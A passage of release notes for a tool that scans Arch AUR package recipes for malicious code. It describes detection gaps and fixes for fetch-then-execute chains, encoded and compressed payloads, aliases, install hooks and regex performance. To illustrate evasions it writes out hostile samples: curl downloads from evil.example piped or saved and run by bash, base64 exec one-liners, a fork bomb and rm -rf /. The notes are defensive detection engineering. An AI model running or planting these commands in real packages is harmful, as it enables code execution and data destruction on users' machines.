  shell, `Xsession.d` at graphical login, a D-Bus policy grants a service the
  right to be activated on demand, and `sudoers.d` decides who may become
  root. All of them are claimed now.

  Two things were deliberately left out after measuring. `/usr/share/
  applications` is where every GUI package puts its menu entry - it runs when
  the user clicks it, which is not persistence - and `tmpfiles.d`,
  `sysusers.d`, `udev/rules.d`, `modprobe.d` and `ld.so.conf.d` are what
  ordinary driver and library packages ship; including them fired on 30
  benign packages and would have made the rule mean "this package installs
  files".

  Widening it also exposed that the rule matched a path *mention* rather than
  a write: `if [[ -f /etc/profile.d/cuda.sh ]]` tests for a file rather than
  planting one. A write verb is now required, which removed a pre-existing
  false positive - the benign flag rate ends one *below* where it started.

- **Verification was checked on one checksum array out of seven.**
  `detect_checksum_changes` read `sha256sums` alone, on the reasoning that it
  is makepkg's default. makepkg verifies with whichever array the package
  declares, and modern AUR packages increasingly ship `b2sums`, so the default
  was becoming the minority case: `b2sums=('SKIP')` disabled verification and
  reported `unchanged`, which is R004 not firing at all. Every array counts
  now, and a SKIP anywhere wins over a hash elsewhere - the array carrying
  SKIP is the one that stopped verifying a source.

  Widening it exposed a second defect underneath. The justification checks
  (`is_skip_justified`) anchored on *added* lines, so a `-git` package whose
  `source=(git+...)` sat on an unchanged context line had its mandatory SKIP
  read as unjustified. That was invisible while only `sha256sums` was read,
  because these packages carry `b2sums` or `md5sums`. A VCS source is a fact
  about the package whether or not this diff changed the line; removals still
  justify nothing. Net effect on the locked benign corpus: 26 spurious HIGHs
  became 6, and those six are genuine - remote tarballs from `deb.debian.org`,
  `dl.discordapp.net` and GitHub releases with verification switched off.
  Flag rate 377 -> 384.

- **A recipe that installs packages.** `pacman -U ./evil.pkg.tar.zst` inside
  `build()` installs a package as root, scriptlets and all, and `pacman -S`
  downloads one first. R081 claims *foreign* package managers in install
  hooks; pacman is not foreign and a build function is not a hook, so this
  fell between the two - a recipe has no business installing packages, since
  makepkg resolves `depends` for that. X011 covers them, and the local-path
  stand-down that mitigates `pip install .` deliberately does not apply: for
  the distribution's own tools a leading `./` means a local package installed
  as root, not an artifact this recipe just built.

- **A companion referenced by a pattern was never read.** `for i in 1 2 3; do
  bash r$i.sh; done` and `for f in *.sh` name a *set* of committed files, and
  companion selection tested for a literal name - so a payload split across
  `r1.sh`, `r2.sh` and `r3.sh` was committed, executed, and never scanned. A
  variable and a `*` are the same wildcard for this purpose. A reference that
  would match everything (`bash "$f"` alone) selects nothing, because it names
  nothing.

- **`cvs` and its root notation.** `cvs -d :pserver:host:/repo checkout` names
  a remote in a form that is neither a URL nor an ssh address, and the client
  pattern swallowed the root between the verb and the command - so looking
  only at the text *after* the client found nothing.

- **A build driver is an execution of its input file.** `curl -o Makefile URL`
  followed by `make` fetches a script and runs it, and neither half was paired
  with the other: `make` matched no execution pattern, and `Makefile` sat in
  the benign-artifact exemption - which claims "this file came with the
  project" and was reading the filename instead of the provenance. The same
  correction the committed-`configure` case needed. `make -f zz.mk`,
  `cmake`, `ninja` and `meson` resolve their input the same way.

- **A fetch with no destination still writes a file.** `wget URL` saves the
  URL's basename and `curl -O URL` asks for exactly that, so the file the next
  line ran was never written down anywhere and R137 had nothing to pair.
  `curl -O` also takes no argument, and reading the URL after it as a
  destination produced a path like `https:/e.x/x.sh`.

- **`conflicts=` had no counterpart to `replaces=`.** All three fields insert
  a package in front of a name the ecosystem relies on: `provides` and
  `replaces` claim to *be* it, and `conflicts` makes pacman refuse to install
  it alongside - which removes the real package just as effectively.
  `replaces=('firefox')` scored HIGH and `conflicts=('firefox')` scored
  nothing. Symmetric now, with the own-variant suppression that the other two
  already had, and no change on the benign corpus.

- **A heredoc's destination can be named on either side of the delimiter.**
  `bash <<EOF` puts it before and `cat <<'EOF' | sh` puts it after; only the
  left half was read, so the piped form - which is how the shape is usually
  written - stayed classified as data.

- **`scp host:/x.sh` is a remote read.** The user part is optional, and
  requiring `@` left the fetch unattributed while R137 paired the write with
  its execution. The host must carry a dot, or every `make target:` reads as a
  remote.

- **A comment was claimed as live code.** `# curl ... | bash` scored R001
  CRITICAL and R061 HIGH - 85, a Critical band - on a line that runs nothing.
  Comments were filtered for raw-line rules by `filter_raw_lines` and not for
  resolved ones. `tests/test_injection_surface.py` had pinned this explicitly
  as *"pinned, not endorsed ... so that a change to it is a decision rather
  than a surprise"*; this is that decision. A rule whose target is the reader
  rather than the shell opts back in with `include_comments`, which is what
  R012 and R013 do.

- **A byte-order mark was a FATAL finding.** R013 claims U+FEFF wherever it
  appears, so a PKGBUILD saved by an editor that writes a BOM scored
  100/Critical - the maximum severity this tool has - for its encoding. A BOM
  is an encoding artifact when it opens a line and a zero-width character in
  code anywhere else, and mid-line stays claimed: `make\ufeffinstall` displays
  as two words and runs as one.

- **`x=` and `x=''` were different assignments.** The value was required, so
  the empty form was never recorded - and bash expands `ba${x}sh` to `bash`.
  X002 also gained the spliced form: every shape anchored the variable at the
  start of the word, so `${D}url` was claimed and `ba${x}sh` was not. That is
  the *only* word-splitting spelling that runs; `ba<TAB>sh` and
  `ba<U+3164>sh` are "command not found", verified against bash itself.

- **Companion selection required a literal name, and skipped `.install`.**
  `npm install` reads package.json without the recipe naming it, and
  `cargo build` compiles build.rs - the records whose contents actually run
  were exactly the ones excluded. A `.install` scriptlet runs as root and is
  the most consequential text in an AUR package; a hook committed in an
  earlier commit was never read, so `post_install() { curl ... | bash; }`
  scored 15 for the attribute change and nothing for the payload.

- **A path traversal read as a different directory.** The shell does not
  collapse `..` - the kernel does, when the file is opened - so
  `"$pkgdir"/lib/../etc/cron.d/y` writes into `/etc/cron.d` while every rule
  anchored on `$pkgdir/etc/cron.d/` read a path into `/lib`.

- **`_NETWORK_FETCH_RE` was quadratic.** It paired a client with a URL across
  a lazy span, which on any line holding a client and no address retried
  every split point: a full-length hostile line measured 304 ms, and the
  regex-safety audit refused the pattern. Replaced by two anchored searches
  and a position comparison, which also let the address be an ssh remote
  (`git clone git@evil.example:r.git`) rather than only an `http(s)://` URL.

- **The decoder alphabet had one spelling per operation.** X001 claimed
  base32/basenc/uudecode/openssl/xxd/tr and, after the previous entry,
  compression - on the reasoning that they "decode the same payload into the
  same shell". The zip family reads a member to stdout with verbs that look
  nothing like a decompressor flag, and decryption is decoding too:
  `unzip -p p.zip | bash`, `funzip`, `ar p`, `unrar p`, `gpg -d` and
  `gpg --decrypt` all intersected no rule at all. `basenc` was worse than a
  gap - its arm required `--algorithm` *before* `-d`, so reversing two flags
  on the same command took a CRITICAL to nothing. All now fire.

- **The write tracker knew only what the shell itself does.** R121/R124
  recognised `cat`, `tee`, `printf`, `echo` and shell redirects, so every
  other way of putting decoded bytes in a file left the write unseen and the
  `bash s.sh` on the next line paired with nothing. Three distinct escapes,
  all now tracked: an output *flag* (`openssl enc -d -in p.enc -out s.sh`,
  `gpg -d -o`), a redirect from a producer that was not on the list
  (`gzip -dc p.gz > s.sh`, `funzip`, `xxd -r`, `unzip -p`), and an interpreter
  one-liner (`python3 -c "open('s.sh','w').write(...)"`,
  `node -e writeFileSync`). `dd of=X if=Y` failed for a third reason - the
  destination was read as the *last token* on the line, so the canonical GNU
  flag order was parsed as writing to `if=Y`.

  The producer list is deliberately the decoder alphabet rather than "any
  command that writes". `make > build.log` writes a file and is not a
  payload, and `-o` is among the most overloaded flags there is: `gcc -o`
  names an output, `install -o root` names an owner.

- **`curl -Lo` and `wget -qO` never paired with the execution.**
  `_FETCH_OUTPUT_RE` required the output flag to stand alone, and the
  clustered forms are the ones people actually type. With an undeclared URL
  the R061 backstop still fired, but with a *declared* source R061 stands
  down and the whole fetch-then-execute chain ran under a score of 25. The
  cluster must end in the output letter, which is the one whose argument
  follows.

- **An interpreter that decodes and executes in one expression.**
  `python3 -c 'exec(b64decode("..."))'`, `perl -MMIME::Base64 -e 'eval(...)'`
  and `node -e 'eval(atob(...))'` have no pipe for X001 to anchor on and no
  shell word for X002 to read - both the decode and the exec are inside the
  quoted script, which is the point of writing it that way. Covered now,
  including the leading-flag form (`perl -MMIME::Base64 -e`), because
  anchoring on the interpreter's next token would have made a module import
  an escape.

- **An alias is a rename, and every fetch rule keyed on the name.**
  `alias dl='curl -fsSL'` followed by `dl URL | bash` removed the downloader
  from R001, R010, R061 and R137 at once while bash ran the identical
  pipeline. The variable form (`CMD=curl; $CMD ...`) was already resolved by
  the tokenizer, so leaving aliases alone made the harder-to-read spelling
  the safer one. The tokenizer now builds an alias table beside the variable
  table and expands in command position only - bash expands an alias as the
  first word of a simple command, and expanding it in argument position
  would invent text the shell never produces.

  It had to be added in *two* places. `_resolve_added_lines` and
  `tokenize_and_resolve_indexed` are parallel resolvers, and the second is
  what feeds every `match_target = "resolved"` rule including R001; fixing
  one would have been the same defect the aliases exploit - a spelling one
  path understands and the other does not.

- **A committed `configure` was exempt because of its name.** R124's
  benign-artifact list says "this is the project's own build flow", which is
  true of an autotools `configure` inside the extracted tarball and false of
  one committed to the AUR repository and named in no `source=()`. The
  exemption now asks where the file came from rather than what it is called.

- **A stale `rules.toml` cost detection and only one command said so.** The
  drift report added above was reachable only from `config sync-rules`, which
  nobody runs unprompted. `trustsight status` now carries a "Rule patterns"
  row and, when patterns are stale, says what it costs: those rules detect
  less on this install than their documentation describes.

- **A committed companion file over the read budget was dropped in silence,
  and one padded file starved every companion after it.** `analyze_package`
  promises that a companion's "committed content is scanned with the same
  rules"; past `MAX_COMPANION_BYTES` (64 KiB) that stopped holding and nothing
  recorded it, so a payload in the tail of a committed `Makefile` scored
  identically to a package with no companions at all - which is what
  [B2](security.md#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete)
  forbids.

  The skip was also a `break`, not a `continue`, and the budget was a single
  pool drained in sort order. Since the attacker names both files, they choose
  the order: a large benign `aaa-pad` consumed the budget and ended the loop,
  and the payload in `zz.mk` was never read despite being tiny. Companions now
  get an equal share of the same total budget, so no one file decides how much
  the others get; an oversized file has its head read within that share instead
  of being dropped whole; and anything cut raises a `companion_truncated`
  coverage gap. Spends no more bytes than before.

  A hardening test claiming "the oversized blob's data must never be read" had
  been passing without ever reaching the size check - its fake tree was a list,
  and `_top_level_blob` subscripts by name, so the function returned early
  every time. Fixture fixed; the ordering it pins is now actually exercised.

- **The list that silenced a rule was wider than the list that caught.** R061
  stands down when it believes R001 owns a line, and it made that call with an
  executor vocabulary R001 had never seen: `curl url | ksh -s` silenced R061
  and then fell straight through R001, turning a CRITICAL into a LOW. Six
  copies of the list existed - R001/R002 knew `bash|sh|python|zsh|dash|busybox
  sh`, R127 knew `bash|sh|zsh|dash`, `_PIPE_TO_SHELL_RE` knew a sixth spelling
  - and they had been edited separately. There is now one definition
  (`config.SHELL_EXECUTOR` / `SCRIPT_EXECUTOR` / `ANY_EXECUTOR`), substituted
  into the rule TOML rather than transcribed into it, covering ksh, mksh,
  pdksh, yash, posh, ash, busybox ash, perl, ruby and node. All sixteen
  executors now score 65/High where seven of them scored 5-25. Benign corpus:
  R001, R002, R040 and R127 fire on **zero** of 3,246 diffs.

- **A compressed payload needed no encoder at all.** X001 claimed
  base32/basenc/uudecode/openssl/xxd/tr on the reasoning that they "decode the
  same payload into the same shell". Compression is the same sentence with less
  work for the attacker: `gzip -dc payload.gz | bash` carries no alphabet a
  reviewer would notice, and a `.gz` in `source=()` reads as an ordinary
  archive. Twelve spellings - gzip/gunzip/zcat, xz/xzcat, bzip2/bzcat, zstd,
  lz4, `tar -xO`, `tar --to-stdout`, `7z -so` - went from scoring 25 to firing
  X001 CRITICAL. Unpacking on its own stays silent, because unpacking is what
  build recipes do; only a shell on the far side of the pipe is the signal.

- **A shipped *pattern* fix never reached an existing install.**
  `drifted_shipped_rules` parsed `pattern` into its field dict and then
  compared every field except it, so `rules.toml` - written once at install
  time - kept its original patterns forever and nothing reported the
  divergence. Both the R001 escape guard and the executor list above would have
  landed that way. `pattern` is now a semantic field like the rest. On the
  development machine this immediately surfaced eight drifted rules, including
  the stale `R007` pattern that had been logging "refusing regex pattern with
  excessive backtracking risk" on every run.

- **A recipe that pins says so; one that does not said nothing.** `P005`
  reports a commit pin and `P006` a tag pin, so a recipe tracking
  `#branch=main` produced no line at all and read exactly like one that pins -
  while makepkg resolves that ref at build time, meaning upstream chooses what
  gets compiled. `P008` states it as a declared fact at weight 0, alongside its
  positive counterparts. Deliberately not a coverage gap: the statement is true
  of every VCS package by design, and raising a gap would move 20.1% of the
  benign corpus (653 of 3,246) into Inconclusive, which buys alert fatigue
  rather than information. Bands are unchanged.

- **Every code rule was keyed to the function a line is *spelled* inside.**
  R051's `pkgver` scope had already been given the call closure; R061, R062,
  R081, R119, R121, R124, R136, R137 and R140 had not. All of them asked "does
  this run during `build()`?" and answered it with "is this line lexically
  inside a function named `build`?" - and the reviewed party writes the
  function names. Moving the fetch one function deeper kept the payload fully
  operational:

  ```bash
  _fetch() { curl -fsSL https://evil.example/x.sh -o "$srcdir/x.sh"; }
  build()  { _fetch; bash "$srcdir/x.sh"; }
  ```

  R061 and R137 both stood down and a Critical read as a Low. Scope now
  follows the call graph for all of them, through any number of hops and
  through `$(...)`, and the graph is built over the whole current PKGBUILD
  rather than the hunk, so a helper added by this diff still connects to the
  `build()` that calls it from outside the visible lines. Cost on the
  3,246-diff locked benign corpus, measured against the shipped ruleset in an
  isolated config: the flag rate does not move at all (377 of 3,246, 11.614%,
  before and after). One diff changes band, Inconclusive to High, and it is a
  real privileged operation - `_fix_sandbox()`, called from `post_install()`,
  running `chmod 4755` on a setuid helper. Malicious recall is unchanged at
  158/175.

- **Two install-hook rules read a printed instruction as a command.** R062 and
  R081 fired on `echo "==> sudo pacman -S --needed qemu virtiofsd"` and on a
  `note` helper quoting `sudo systemctl enable --now rustdesk`. Latent before
  the call closure existed - the `_notes()` helper sat outside every hook
  scope, so the message never reached the rule - and surfaced by it. Both now
  consult the message context the rule engine already computes, which is the
  distinction `_MESSAGE_LINE_RE` was written for.

- **An interpreter is a network client.** R061's fetch pattern listed
  `python -c ... urllib` - not `python3 -c`, which is the spelling every
  current recipe uses, and not perl, ruby or node at all. `curl` and `wget`
  are what a reviewer greps for, so an author avoiding the grep reaches for
  the runtime that is already a makedepend. The arm now covers
  `python[23]? -c`, `-m http|urllib|pip`, `perl -e` with LWP/HTTP::, `ruby -e`
  with Net::HTTP/open-uri and `node -e` with https.get/fetch. It also needed
  its own tail: a shell command ends at `;`, but `python3 -c 'import
  urllib;urlretrieve(url)'` puts a semicolon between the client and its URL as
  a matter of Python syntax, so sharing one `[^|;&]` tail restricted the
  interpreter arm to one-statement scripts. R137 learns the same shapes,
  including where `urlretrieve(url, path)` puts what it downloaded, so an
  interpreter fetch pairs with the later execution of what it wrote.

- **A heredoc into a shell was exempted as if it were data.** `_heredoc_body_indices`
  treats a heredoc body as file content - correct for `cat > x <<EOF`, and the
  reason R121/R124/R136/R137 do not double-fire on a generated payload. But
  `bash <<'EOF'` hands the body to a shell, and the body is then the script
  that runs, so wrapping the recipe in one turned four rules off for every
  line inside. The exemption is now decided per heredoc by where it goes.

- **`make` over a repo-committed Makefile executed undeclared code.** `make`
  names no file on the command line, so no execution pattern ever saw one, and
  `make` sits in R124's benign-artifact exemption because almost every package
  runs it. The question is not the command but the file it reads: a `Makefile`
  committed to the *AUR* repository and absent from `source=()` is code with
  no checksum over it. R136 gained an arm for the implicit input of `make`,
  `cmake`, `ninja` and `meson`, gated on a tree manifest so it never guesses.
  All 14 diffs in the locked benign corpus that commit a build file declare it
  in `source=()`, and the arm fires on none of them.

- **A committed payload larger than the read bound was invisible, and the run
  still reported as complete.** `_collect_tree_files` skipped any blob over
  512 KiB, on the reasoning that a committed payload is small. That is an
  assumption about the attacker, and R118 fires on a committed ELF - a payload
  binary is far likelier to be large than small. `tree_analyzed` meanwhile
  reported True because *some* file had been read, so the incomplete walk
  presented as a complete one, which is exactly what
  [B2](security.md#b2-an-unflagged-verdict-is-never-issued-for-an-analysis-that-was-incomplete)
  forbids. Large blobs are now streamed for their magic bytes, which tightens
  the memory bound from 512 KiB to 64 bytes, and the walk reports whether it
  read everything it was asked for.

  Streaming has a trap of its own that the regression test caught: pygit2's
  `BlobIO` feeds from a worker thread through a `Queue(maxsize=1)` and
  `close()` joins that thread, so reading 64 bytes of a 1 MiB blob and closing
  parks the writer on a full queue forever. The first version of this fix was
  therefore a hang that any committed 1 MiB file would trigger - a worse
  denial of service than the gap it closed. The stream is drained before it is
  closed, and a blob past a 64 MiB ceiling is left unread *and reported*
  unread rather than paid for in linear time the attacker chooses.

- **Three CRITICAL rules could be walked past by typing.** `S001` (fork bomb),
  `S002`/`S003` (`rm -rf /`) and crossfire's `home-default` escape each
  required their pattern pieces within a bounded gap - `{0,120}`, `{0,200}`,
  `{0,80}`. The bound was there for backtracking safety, but it is also an
  instruction: `:(){ true; ...x40 :|:& };:` is the same fork bomb, and it read
  as clean. Each span is now unbounded, with a lookahead assertion where the
  span must give ground and a possessive quantifier where it must not, and the
  growth was measured linear over 4x input rather than assumed.

- **A named rule scope was the reviewed party's to choose.** `scope =
  ["pkgver"]` asks whether code runs during `pkgver`, but it was answered with
  whether the line sits lexically inside a function *spelled* `pkgver`. Moving
  the fetch into a helper - `_v() { curl ...; }` called from `pkgver()` -
  silenced R051, a rename as an evasion and the same shape as the
  `package_x-bin` scope hole fixed earlier. Scope now follows the call graph
  transitively, and it changed the fire rate on the 3,246-diff locked benign
  corpus by exactly zero diffs.

- **A stage that failed reported the same thing as a stage that ran and found
  nothing.** Every swallowing handler in `analysis/` returned a neutral value
  on error, which is indistinguishable from "no finding here": an unbalanced
  quote made `shlex` refuse a whole `source=` array, a git walk that raised
  fell back to comparing HEAD against HEAD - an empty diff, in which every
  rule matches nothing - and the verdict still read UNFLAGGED. Nine such
  handlers now record a `stage_degraded` coverage gap, which forbids an
  unflagged verdict.

  Making the gap mean something required fixing what it exposed. Two shapes
  tripped it on ordinary recipes: a multi-line `source=()` array with trailing
  backslash continuations, and a `#` comment inside such an array containing
  an apostrophe (`# makepkg doesn't understand SSH signatures`). Both are
  handled, and one handler was removed outright - `data.decode(errors=
  "replace")` cannot raise, so the `except` around it could only ever have
  hidden a bug. The gap fires on 0 of 3,246 benign diffs.

- **Two render paths sanitised untrusted text with the weaker helper.**
  `safe_text` is explicit that the boundary is where a value is *rendered*,
  so stored evidence and JSON stay byte-exact. Two paths used
  `unicode.strip_ansi` instead, which removes CSI sequences and leaves C1
  control bytes, BEL and newlines behind. `\x9b2J` is the 8-bit spelling of
  "clear the screen", so an attacker-derived finding reason could repaint
  the terminal, which is precisely the forgery `safe_text` was written to
  prevent. Both spellings look like sanitising at a glance, which is why
  this survived review.

- **Federated IOC values were passed to Rich as bare strings.** `ioc.py`
  did not import `clean` at all and rendered the indicator value, its
  source and its confidence directly. Rich parses a bare `str` as markup,
  so an entry containing `[/]` raises `MarkupError` and **aborts the whole
  table**: one hostile indicator in an imported baseline made `ioc list`
  unusable rather than merely ugly. IOC federation means third parties
  supply these fields by design. Values are now `clean`ed and wrapped in
  `Text`.

  A new `untrusted text is sanitised where it is rendered` gate checks both
  properties across every CLI module, on calls and imports rather than on
  the substring so that a comment explaining the rule does not trip it.


- **Three rule patterns did not exist until match time, and nothing audited
  them.** R013, R047 and R048 carry a placeholder in the TOML and are
  assembled when `apply_rules` runs: R013 from Unicode data, R047 and R048
  from operator config. That made them invisible to all three of the
  audit's collection strategies at once, since they are not a TOML literal,
  not a `re.compile("literal")` in the source, and not a module-level
  `re.Pattern`. R013 is the **FATAL** homoglyph rule, and because R047/R048
  are derived from config, a config edit could have introduced a slow
  pattern with no gate positioned to notice.

  Generation moved into `rules.resolve_generated_patterns`, which
  `apply_rules` and the audit both call, so the audit checks the pattern
  that actually executes rather than the placeholder. Auditing a
  placeholder is worse than not auditing: it reports coverage it does not
  have. All three measured fast and needed no change.

- **The regex audit was blind to 18% of the patterns it was meant to cover.**
  It collected patterns by walking the AST for `re.compile("literal")`, so
  a pattern assembled from parts, `re.compile(_WRITE_CMD_START + r"tee ...")`,
  is a `BinOp` rather than a `Constant` and was skipped in silence. That was
  **44 of 246 patterns**, concentrated in `sabotage` (11), `persistence` (6)
  and `crossfire` (4): the modules built from shared command-start prefixes,
  where one bad component would have spread across many rules unchecked.

  The audit now also enumerates every compiled pattern reachable from an
  imported module, which is the only way to see a pattern whose text does
  not exist until it is built. Coverage went from 233 to 255 distinct
  patterns, deduplicated by pattern text so the count means something, and
  the audit applies the same growth check `rules._compiled` does.

  A new `every live regex is audited` gate asserts the *coverage* rather
  than the verdict, because a gate that passes because it never looked is
  the failure this codebase keeps finding. All three previously unaudited
  patterns that exceeded 10 ms on a full line were measured and are linear,
  a large constant rather than a complexity bug, so nothing needed fixing
  once they were finally visible.

- **Three shipped patterns were quadratic, and the probes could not see it.**
  `BACKTRACK_REPS` is 22, which is tuned for *exponential* backtracking:
  2^22 is millions of steps and shows instantly. Polynomial cost is
  invisible there - 22 squared is 484 steps - while rules run against lines
  up to `rules.MAX_RULE_LINE_BYTES` (8192), where the same pattern costs 67
  million. Every one of these passed the short probes and the CI audit:

  | Pattern | Cost on one 8 KiB line | After |
  |---|---|---|
  | `novelty._VERSION_RE`, `\d+(?:\.\d+){1,}` | 3215 ms | 2.2 ms |
  | `build._SUDO_CMD_START_RE`, two adjacent `\s*` | 1113 ms | 0.6 ms |
  | `novelty._TRAILING_RE`, `/+$` | 596 ms | replaced with `rstrip` |
  | `sabotage._FORK_BOMB_DEF_RE` | 20 ms | 5.7 ms |

  A 5 MiB diff of full-length lines is ~640 lines, so the version matcher
  alone was about **36 minutes of CPU** for one package - under every cap
  added this release. Aggregate worst case across all patterns fell from
  4870 ms to 143 ms. The fixes are bounded repetition (`\d{1,32}`),
  possessive quantifiers, collapsing an ambiguous `\s*\s*` pair, and one
  regex deleted in favour of `str.rstrip`; behaviour is unchanged in every
  case, checked against the shapes each rule exists to match.

  The detector now probes at `LONG_PROBE_LEN` (2048) as well as 22, and
  measures **growth** rather than only absolute time: four times the input
  costs about four times the time when a pattern is linear and sixteen when
  it is quadratic, so `SUPERLINEAR_GROWTH` separates them. Absolute time
  alone was not enough - the `sudo` pattern is quadratic with a small
  constant and sat under the budget at the probe length while still costing
  seconds at a full line. `lint` reports the growth case with its own
  message, because "cheap on a short line, expensive on a long one" is not
  what a rule author reads "exponential" to mean.

  Two patterns previously documented here as linear - `(-?\d+,)+;` and
  `(a|ab)+c` - are quadratic (15.4x and 14.8x growth for 4x input). They
  were classified from measurements at n<=26, which is exactly the blind
  spot being closed. Prefix-overlap alternation is refused again, now on
  measurement rather than on a structural guess.

- **The one runtime-built pattern is now audited like a shipped one.**
  `scripts/regex_audit.py` reads source, so it covers every `re.compile` in
  the tree - except the pattern `find_line_in_diff` assembles from its
  argument. That function took regex syntax, compiled it **unescaped
  first**, and fell back to escaping only on `re.error`, so any argument
  that was *valid* regex ran as one against every line of the diff, with no
  backtracking check anywhere on the path. A supplied `(a+)+$` cost **5.6
  seconds against a single 24-character line**, doubling every two
  characters after that.

  All twelve call sites pass either an intentional pattern or an escaped
  fragment, so nothing was exploitable today; the exposure was that
  forwarding package text once would have been enough. A dynamic pattern is
  now held to the same standard as a shipped one, and a refused pattern is
  matched as the literal text it probably was rather than dropped - 5.6s
  becomes 0.000s and the intentional patterns still work.

  Two copies of the function existed, in `analysis/delivery.py` and
  `analysis/structural.py`. They are one shared helper in `rules.py` (which
  already owns the regex-safety import), with a test asserting no local copy
  returns, because identical code in two modules is how a fix lands in one
  of them.

- **A URL is sliced before it is escaped, not after (C005).** Cutting an
  escaped string can cut an escape sequence in half; the compile then fails,
  the fallback escapes the already-escaped text, and the line number is
  silently lost - on exactly the long URLs the rule is reporting.

- **The backtracking detector is probed with the pattern's own alphabet.**
  `regex_safety` decides whether a pattern may run against hostile text, so
  its sensitivity is the security property. It ran six fixed probes made of
  `a`, spaces, `/` and `|` - **no digit appeared in any of them**, so every
  pattern driven by `\d` or `[0-9]` was tested with input it could not
  match and scored a risk of exactly 0.0s, which reads identically to safe.
  Of ten known-catastrophic patterns, five passed.

  Probes are now derived from each pattern's own classes and literals, which
  generalises instead of extending a list of the attacks somebody thought
  of. Two fixed probes were added for shapes the derivation does not reach:
  a digit run, and a dotted name with no scheme - `https://a.a.a.com` cannot
  reach a `^`-anchored host pattern, because it fails at position 0 before
  any backtracking starts, and host-shaped patterns are everywhere here. The
  structural check also now catches a quantified character class inside a
  quantified group (`([0-9]+)+`) and identical alternation branches
  (`(x|x)*`). All ten are refused; 233 shipped patterns and 11 TOML rule
  patterns still compile, and probing a safe pattern costs 0.027 ms.

  Prefix-overlap alternation (`(a|ab)+`) is deliberately **not** refused.
  The textbook calls it ambiguous, but measured in CPython it is flat under
  both attack shapes, and a refused pattern does not raise - `_compiled`
  returns None and the rule quietly stops matching. A false refusal is a
  hole, not an inconvenience, so the check stays where the evidence is.

- **A line-count cap on rule matching (`rules.MAX_SCANNED_LINES`).**
  `MAX_RULE_LINE_BYTES` bounded how *long* a line may be and nothing bounded
  how *many* there are, but matching costs per line - about 0.46 ms - so the
  5 MiB byte cap permitted ~1.3 million short lines and roughly **ten minutes
  of CPU** for one package, times `depth.MAX_DEPTH_NODES` (200) at full
  depth. A 200,000-line diff now takes 8.9s instead of 92s.

  The cap is 20,000: five times the largest diff in the 3,739-diff locked
  benign corpus (3,839 lines; p99.9 is 2,117), so it truncates none of them.
  Truncating reports a new `scan_truncated` coverage gap and sets the
  matching `scan_truncated` field on the report, kept distinct from
  `diff_truncated` because they name different dials - a reader who saw only
  the byte gap would raise `[diff] max_diff_bytes` and find it changed
  nothing.

  `analyze_package` and `scan_diff` are parallel implementations that each
  tokenize and each match, so the clamp is one shared helper rather than two
  copies, and a test walks the AST to assert nothing tokenizes an unclamped
  diff. The byte cap beside it was originally written on the git path alone,
  which is the same mistake one step earlier.

- **Resource bounds derived from the resource, not from the wire format.**
  A14 says no package-controlled input decides how much CPU, memory, network
  or disk this process uses. Five places bounded an input without bounding
  what the input became, and each looked adequate on its own:

    - `MAX_DECOMPRESSED_BYTES` was set against the ~250 MB AUR dump on the
      wire. Measured with `tracemalloc`, dump-shaped JSON parses into Python
      objects at about **6x** its serialised size, so the 1 GiB ceiling
      permitted ~6.1 GiB of live objects. Lowered to 512 MiB, with the
      measured factor recorded as `JSON_OBJECT_AMPLIFICATION` so the ceiling
      can be re-derived rather than guessed at.
    - The IOC baseline loader capped bytes (`MAX_BASELINE_BYTES`, 256 MiB)
      and not entries, so a baseline was millions of `IocEntry` objects.
      Added `MAX_BASELINE_ENTRIES`.
    - Clones and fetches were bounded by a 120-second deadline and nothing
      else. A deadline is not a byte budget: on a fast link it is gigabytes
      written straight to the cache. Added `MAX_TRANSFER_BYTES` (256 MiB) via
      the existing progress callback.
    - A per-repository ceiling is not a disk bound, because the dependency
      walk multiplies it by `depth.MAX_DEPTH_NODES` (200) - two caps that
      each look sufficient compose to their product, 50 GiB. Added
      `MAX_TOTAL_TRANSFER_BYTES` (2 GiB), charged across the whole run.
    - Repository history is authored by the party under review, and three
      walks ran it to exhaustion - one of them decoding a PKGBUILD blob per
      commit. Added `MAX_HISTORY_COMMITS` and `fetcher.walk_bounded`, a
      single implementation the fourth walk (`temporal`, which had its own
      inline counter) now shares. A test asserts no raw `repo.walk` survives
      outside it, because "a control applied at one of several equivalent
      call sites" is the recurring failure this codebase has.

  An oversized transfer raises a `_TimeoutError` subclass deliberately:
  every call site already treats that as "this fetch did not complete", and
  a new exception type would be a second path for one of them to forget.
  There is no GPU bound because there is no accelerator code - nothing in
  the tree imports CUDA, PyTorch, OpenCL or NumPy.

- **A crafted `source=` URL could cost half an hour of CPU.** URL
  classification walked every hostname label and computed every parent
  domain, which is quadratic in label count. One 8 KiB host made of dots took
  421 ms, and `MAX_URLS_PER_SIDE` allows 4,096 URLs per side, so a single
  package could spend roughly 29 minutes in classification alone - A14 says no
  package-controlled input decides how much CPU this process uses.

  Bounded by DNS's own limits, `MAX_HOST_BYTES` (253) and `MAX_HOST_LABELS`
  (127): nothing past those is a hostname anyone can resolve. A full cap of
  4,096 hostile URLs went from **163 s to 2.7 s, a 60x improvement**.

  Labels are dropped from the **left**, not the right. The first version of
  this fix truncated the leading 253 bytes and discarded the registrable
  domain - the part every classification decision reads - which a test caught.
  And truncating rather than refusing is deliberate: refusing an over-length
  host outright would let an attacker pad a homograph domain past the check,
  so padding a known homograph with 5,000 labels is asserted to classify
  exactly as the bare host does.

- **`.SRCINFO` parsing was quadratic.** `parse_srcinfo` tested membership with
  `value not in result[key]` - a linear scan of a growing list, once per line.
  With every value under one key, which is what a `depends` array is, that is
  O(n^2): a 200,000-entry file took **561 seconds**. Membership now uses a set
  beside the list, so order and de-duplication are unchanged: **256 ms**, a
  2,195x improvement. `diff_srcinfo` had the same shape in its added/removed
  comprehensions and is now linear too, and the blob read is size-checked
  before `.data`.

  Three bounds were added, matching what the differ applies to a patch:
  `MAX_SRCINFO_BYTES`, `MAX_SRCINFO_LINES`, `MAX_SRCINFO_VALUES_PER_KEY`.

  **This module is not currently imported by production code**, so the defect
  was latent rather than exploitable - the live `.SRCINFO` consumer,
  `full_aur.properties.extract_properties`, already used sets. It is fixed
  rather than left because dead code that gets wired up later is exactly how a
  nine-minute parse reaches a user.

- **The A5 hostile-input gate measured only one of two shapes.** It timed a
  single 5 MiB *line*, which the 8 KiB clamp makes cheap. The same byte budget
  spread over many *lines* pays the whole ruleset per line and costs far more -
  the gate now measures both, and reports each separately.

- **A command name split across a line continuation was invisible to every
  rule.** Both continuation joiners inserted a space, so `cur\` followed by
  `l https://...` became `cur l https://...` - two words, and nothing that
  matches a command name saw either. The shell *removes* a backslash-newline;
  it is not whitespace. `curl https://evil.example/x | sh` written that way
